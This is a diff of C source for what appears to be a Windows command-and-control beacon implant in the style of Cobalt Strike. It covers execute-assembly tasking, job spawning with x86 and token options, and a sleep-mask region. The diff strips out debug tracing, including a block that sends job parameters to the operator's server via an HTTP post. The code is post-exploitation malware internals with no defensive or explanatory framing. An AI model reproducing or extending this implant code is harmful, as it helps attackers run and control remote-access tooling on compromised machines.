@@ -1,7 +1,6 @@
 #include <winsock2.h>
 #include <Windows.h>
 #include <stdlib.h>
-#include <stdio.h>
 #include <string.h>
 #include "beacon.h"
 #include "commands.h"
@@ -10,8 +9,6 @@
 #include "gargleint.h"
 #include "hostprof.h"
 #include "syscalls.h"
-#include "x86trace.h"
-#include "channel.h"
 
 extern char sleepmask_region[];
 
@@ -400,7 +397,6 @@ void command_data_store_inline_execute(char * buffer, int length) {
 }
 
 void command_data_store_execute_assembly(char * buffer, int length, BOOL x86, BOOL ignoreToken) {
-	x86_bc("0");
 	datap parser;
 	int index;
 	datap_buffer jobblob;
@@ -446,14 +442,6 @@ void command_data_store_execute_assembly(char * buffer, int length, BOOL x86, BO
 	}
 	x86 = (inner_type == 70 || inner_type == 87);
 	ignoreToken = (inner_type == 70 || inner_type == 71);
-	x86_bc(x86 ? "1" : "8");
-	{
-		char line[96];
-		_snprintf(line, sizeof(line), "inner=%u x86=%d wait=%u off=%u dll=%d plen=%d\n",
-			inner_type, (int)x86, wait, offset, dlllen, extra.length);
-		command_shell_post(line, (int)lstrlenA(line), CALLBACK_OUTPUT, FALSE);
-		http_flush_post(setting_ptr(SETTING_SUBMITURI));
-	}
 	command_job_spawn_logic(jtype, wait, offset, dll, (DWORD)dlllen, extra.buffer, extra.length, desc, dlen, x86, ignoreToken);
 	BeaconDataStoreProtectItem((size_t)index);
 }
